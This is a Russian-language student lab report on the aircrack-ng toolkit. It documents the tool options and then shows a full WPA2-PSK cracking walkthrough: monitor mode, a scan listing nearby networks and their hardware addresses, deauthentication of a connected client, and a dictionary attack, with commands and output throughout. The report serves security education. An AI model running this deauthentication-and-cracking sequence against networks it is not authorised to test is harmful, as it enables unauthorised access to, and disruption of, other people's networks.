\documentclass[10pt,a4paper]{report}
\usepackage[utf8]{inputenc}
\usepackage[russian]{babel}
\usepackage{amsmath}
\usepackage{amsfonts}
\usepackage{amssymb}
\usepackage{graphicx}
\renewcommand{\thesection}{\arabic{section}}
\setcounter{totalnumber}{10}
\setcounter{topnumber}{10}
\setcounter{bottomnumber}{10}
\renewcommand{\topfraction}{1}
\renewcommand{\textfraction}{0}
\author{Никитина Анна}
\title{Лабораторная работа №6.\\
	Набор инструментов для аудита беспроводных сетей AirCrack}
\begin{document}
\maketitle
\tableofcontents
\pagebreak

\section{Цель работы}
Изучить основные возможности пакета AirCrack и принципы взлома WPA / WPA2, PSK и WEP.
\section{Ход работы}
\subsection{Изучение}
\subsubsection{Изучить документацию по основным утилитам}
\paragraph{Пакет airmon-ng} может быть использован для включения или отключенич мониторинга беспроводного интерфейса.  Основные утилиты: \\
\begin{itemize}
\item airmon-ng - проверить состояние беcпроводных интерфейсов
\item airmon-ng check - проверить на наличие мешающих процессов
\item airmon-ng check kill- остановить мешающие процессы
\item airmon-ng start wlan0 - включить режим мониторинга
\item airmon-ng stop wlan0 - отключить режим мониторинга
\end{itemize} 
\paragraph{Пакет airdump-ng} используется для захвата пакетов кадров 802.11, также походит для получения веторов инициализации (IV) для WEP. \\
Применение: airodump-ng <options> <interface>[,<interface>,...] \\
Опции:
\begin{itemize} 
\item ivs : сохранить только захваченные IVs
\item write <prefix> : префикс dump файла
\item w : сохранить как --write
\item update <secs> : задержка обновления дисплея в секундах
\item showack  : показать статистику ack/cts/rts
\item f <msecs> : время в мс между переключением каналов 
\item и другие
\end{itemize} 
Опции фильтрации:
\begin{itemize} 
\item encrypt <Suite>: фильтрация точек доступа по набору шифров
\item netmask <маска сети>: фильтрация точек доступа по маске
\item С <Частоты>: указание частоты в МГц 
\item cswitch <метод>: установить метод переключения каналов
                   0: FIFO (по умолчанию)
                   1: Round Robin
\item  help
\item и другие
\end{itemize} 

\paragraph{Пакет airplay-ng} используется для вставки кадров. Основная функция заключается в генерации трафика для последующего использования в пакете aircrack-ng для взлома ключей WEP и WPA-PSK. С помощью инструмента packetforge-ng возможно создавать произвольные кадры. \\ Применение:  aireplay-ng <options> <replay interface> \\
Опции фильтраци: \\
\begin{itemize}
\item b bssid : MAC address, точка доступа
\item d dmac : MAC address, адресат
\item s smac : MAC address, источник
\item m len :  минимальная длина пакета
\item n len :  максимальная длина пакета
\item u type : контроль кадра, тип поля
\item v subt : контроль кадра, подтип поля
\item и другие
\end{itemize} 
Опции генерации пакетов: \\
\begin{itemize} 
\item  x - nbpps : количество пакетов в секунду
\item  p - fctrl : установить контрольное слово кадра (hex)
\item  a - bssid : установить MAC-адрес точки доступа
\item  c - dmac : установить MAC-адрес Получателя
\item  h - smac : установить MAC-адрес Источника
\item  e - essid : атака «фальшивая аутентификация»: установить SSID (идентификатор сети) точки доступа
\item  j - arpreplay : атака	генерация FromDS пакетов
\item  g - значение : изменить размер кольцевого буфера (по умолчанию: 8)
\item  k - IP : установить IP адрес назначения в фрагментах
\item  l - IP : установить IP адрес источника в фрагментах
\item  o - npckts : количество пакетов в пачке 
\item  q - sec : количество секунд между посылкой
\item  y - prga : поток ключей (keystream) для авторизации открытым ключем
\end{itemize} 
\paragraph{Пакет aircrack-ng} используется для взлома ключей 802.11 WEP и WPA / WPA2-PSK. Пакет может восстановить ключ WEP после того, как было захвачено достаточное количество пакетов с помощью  airodump-ng. 
Эта часть aircrack-ng набора определяет ключ WEP с помощью двух методов. Первый метод - через PTW подход. Второй метод -  FMS / KoreK. Метод FMS / KoreK включает в себя различные статистические атаки, чтобы обнаружить ключ WEP и использует их в сочетании с полным перебором. Кроме того, программа предлагает метод словаря для определения ключа WEP. \\
Для взлома ключа WPA / WPA2 используется только метод словаря.  \\
Применение:  aircrack-ng [options] <capture file(s)> \\
Опции: \\
\begin{itemize}
\item a - режим атаки (1 =  WEP, WPA 2 = / WPA2-PSK)
\item b	- выбор целевой сети на основе МАС-адреса точки доступа
\item q	- включить тихий режим
\item c	- (WEP cracking)ограничить пространство поиска буквенно-цифровыми символами
\item h	- (WEP cracking) ограничить пространства поиска цифровыми символами
\item d	- (WEP cracking) установить начало ключа WEP, для отладки
\item M	- (WEP cracking) установить максимальное количество векторов инициализации для использования 
\item n	- (WEP cracking) указать длину ключа
\item и другие
\end{itemize}
\subsubsection{Запустить режим мониторинга на беспроводном интерфейсе}
Запустим режим мониторинга на беспроводном интерфейсе wlan0.
\begin{verbatim}
 root@ann-K72JU:~# airmon-ng start wlan0

Found 4 processes that could cause trouble.
If airodump-ng, aireplay-ng or airtun-ng stops working after
a short period of time, you may want to kill (some of) them!

PID	Name
658	avahi-daemon
659	avahi-daemon
927	NetworkManager
1130	wpa_supplicant


Interface	Chipset		Driver

mon0		Atheros 	ath9k - [phy0]
wlan0		Atheros 	ath9k - [phy0]
				(monitor mode enabled on mon5)
mon1		Atheros 	ath9k - [phy0]
mon2		Atheros 	ath9k - [phy0]
\end{verbatim}
\subsubsection{Запустить утилиту airodump, изучить форматы вывода этой утилиты, форматы файлов, которые она может создавать}
\textbf{-w <prefix>, —write <prefix>} \\

Использование префикса файла дампа. Если данный параметр не указан тогда будут отображаться только данные на экране. Помимо этого файла будет создан CSV-файл с таким же именем файла, с каким будет создан захват. \\

\textbf{—output-format <форматы>} \\

Определение форматов для использования, разделенное запятыми. Возможные значения: pcap, ivs, csv, gps, kismet, netxml. По умолчанию используется: pcap, csv, kismet, kismet-newcore. «pcap» используется для записи перехваченных пакетов в формате «pcap», «ivs» является форматом записи перехваченных пакетов в фирмат «ivs» (ярлык для ivs), «csv» программа airodump-ng создаст фаил в формате «csv», «kismet» создаст фаил «kismet csv», а «kismet-newcore» создаст фаил «kismet netxml», «gps» является сокращением для «—gps». Эти значения могут быть объединены, за исключением «ivs» и «pcap».
\subsection{Практическое задание}
Проделаем действия, описанные по ссылке "Руководство по взлому WPA". \\
Запустим режим мониторинга на беспроводном интерфейсе.
\begin{verbatim}
 root@ann-K72JU:~# airmon-ng start wlan0


Found 4 processes that could cause trouble.
If airodump-ng, aireplay-ng or airtun-ng stops working after
a short period of time, you may want to kill (some of) them!

PID	Name
658	avahi-daemon
659	avahi-daemon
927	NetworkManager
1130	wpa_supplicant


Interface	Chipset		Driver

mon0		Atheros 	ath9k - [phy0]
wlan0		Atheros 	ath9k - [phy0]
				(monitor mode enabled on mon5)
mon1		Atheros 	ath9k - [phy0]
mon2		Atheros 	ath9k - [phy0]
\end{verbatim}
Просмотрим все найденный сети.
\begin{verbatim}
 root@ann-K72JU:~# airodump-ng wlan0

 CH 10 ][ Elapsed: 4 s ][ 2016-05-21 20:11                                         
                                                                                                                      
 BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID                                       
                                                                                                                      
 C0:4A:00:E3:0A:C6    0        1        0    0   6  54e. WPA2 CCMP   PSK  room515                                     
 D8:5D:4C:B8:B1:06    0        6        0    0  11  54e. WPA2 CCMP   PSK  Busy Jack                                   
 90:94:E4:EF:8A:A1    0        6        0    0  11  54e. WPA2 CCMP   PSK  DIR-620                                     
 E8:94:F6:DE:2E:C4    0        7        1    0  11  54e. WPA2 CCMP   PSK  room410                                     
 EC:43:F6:CF:80:C4    0        8        0    0  11  54e  WPA2 CCMP   PSK  313  SILA S NAMI                            
 14:CC:20:A1:30:30    0        7        0    0  11  54e. WPA2 CCMP   PSK  513                                         
 EC:43:F6:D5:14:E8    0        3        0    0   5  54e  WPA2 CCMP   PSK  Keenetic-7644                                
 88:E3:AB:C5:99:84    0        7        0    0   9  54e. WPA2 CCMP   PSK  ROOM_511                                    
 E8:DE:27:EB:BD:76    0       14        0    0  10  54e. WPA2 CCMP   PSK  ShinyShade                                   
 C0:4A:00:C9:38:06    0        7        0    0   9  54e. WPA2 CCMP   PSK  NoEasyWayOut                                 
 1C:7E:E5:3E:AF:10    0       16        0    0   4  54e. WPA2 CCMP   PSK  417                                          
 54:E6:FC:F2:FF:00    0       11        3    0  10  54e. WPA2 CCMP   PSK  Signal_is_kosmosa                            
 C4:6E:1F:FC:A9:D8    0        4        0    0   9  54e. WPA2 CCMP   PSK  Izhevsky                                     
 10:BF:48:B2:DF:DC    0        9        0    0   5  54e  WPA2 CCMP   PSK  .19nEw                                       
 A4:2B:8C:67:E5:82    0        7        1    0   3  54e. WPA2 CCMP   PSK  L4D                                          
 C4:6E:1F:0D:EB:A0    0        6        0    0   3  54e. WPA2 CCMP   PSK  room512                                      
 FC:8B:97:61:73:A1    0        2        1    0  12  54e  WPA2 CCMP   PSK  DIR-300                                      
 C8:D3:A3:31:F4:BE    0        8        0    0  12  54e  WPA2 CCMP   PSK  310                                          
 AC:22:0B:54:D5:A8    0        2        2    0  13  54e  WPA2 CCMP   PSK  KrG                                         
 28:28:5D:9F:C2:BC    0        6        1    0  13  54e  WPA2 CCMP   PSK  117_room                                    
 AC:F1:DF:22:4C:2E    0        1        0    0  13  54e  WPA2 CCMP   PSK  poker-club      
 \end{verbatim}
Нас интересует сеть 
\begin{verbatim}
1C:7E:E5:3E:AF:10    0       16        0    0   4  54e. WPA2 CCMP   PSK  417                                          
 \end{verbatim}
Запустим сбор трафика выбранной сети для получения аутентификационных сообщений:
\begin{verbatim}
sudo airodump-ng mon5 --write dump --bssid 1C:7E:E5:3E:AF:10 -c 4 
 CH  4 ][ Elapsed: 16 s ][ 2016-05-21 20:25                                         
                                                                                                                      
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID                                   
                                                                                                                      
 1C:7E:E5:3E:AF:10    0 100      175      185    1   4  54e. WPA2 CCMP   PSK  417                                     
                                                                                                                      
 BSSID              STATION            PWR   Rate    Lost  Packets  Probes                                            
                                                                                  
                                                                                                                      
 1C:7E:E5:3E:AF:10  34:E2:FD:21:9A:34    0    0e- 0      0      169                                                                     
\end{verbatim}
Видим, что к сети подключен один клиент с MAC-адресом 34:E2:FD:21:9A:34, проведем его деаутентификацию дляполучения необходимых для взлома сети сообщений.
\begin{verbatim}
 root@ann-K72JU:~# aireplay-ng -0 1 -a 1C:7E:E5:3E:AF:10 -c 34:E2:FD:21:9A:34 mon5
20:26:47  Waiting for beacon frame (BSSID: 1C:7E:E5:3E:AF:10) on channel 4
20:26:48  Sending 64 directed DeAuth. STMAC: [34:E2:FD:21:9A:34] [ 0|54 ACKs]
\end{verbatim}
После сбора аутентификацинный сообщений, проводим непосредственно взлом сети утилитой aircrack-ng. Передадим на вход утилите словарь паролей, в котором содержатся возможные пароли для сети.
\begin{verbatim}                               
sudo aircrack-ng dump*.cap -w password -b 1C:7E:E5:3E:AF:10
\end{verbatim}
При успешном результате видим сообщение, в которо указан пароль для выбранной сети
\begin{verbatim}   
                                 Aircrack-ng 1.1


                   [00:00:00] 644 keys tested (1418.29 k/s)


                           KEY FOUND! [ ******** ]


      Master Key     : 6B D2 37 35 EB E1 FE F2 88 8A D9 DD 58 7B 8D 84 
                       60 89 6D 8E D0 69 11 61 D0 B0 27 03 27 63 47 76 

      Transient Key  : 33 99 1E 17 64 41 DA 89 DA D0 08 6D C0 8A E1 F8 
                       89 B7 39 AF E2 AF AD F9 3D C4 E8 4B 9B 43 B5 08 
                       6F 28 51 EA A3 B6 56 7D 0C 51 61 7A CE 08 6F 6C 
                       A2 2C E3 38 50 81 0E C3 83 47 8F 09 DB 8F 2E 90 
\end{verbatim}

\section{Вывод}
В ходе данной работы были изучены и применены на практике основные утилиты пакета AirCrack. \\
Данный инструмент позволяет прослушивать определенный беспроводной интерфейс, перехватывать его пакеты, генерировать новые (с помощью данной опции, например, можно отключить любого подключенного к сети клиента). После успешного прослушивания сети есть возможность ее взлома. Например, используя словарь паролей, если пароль интерфейса содержится в переданном утилите словаре, то увидим на экране сообщение об успешном завершении операции и полученный пароль беспроводного интерфейса.
\end{document}
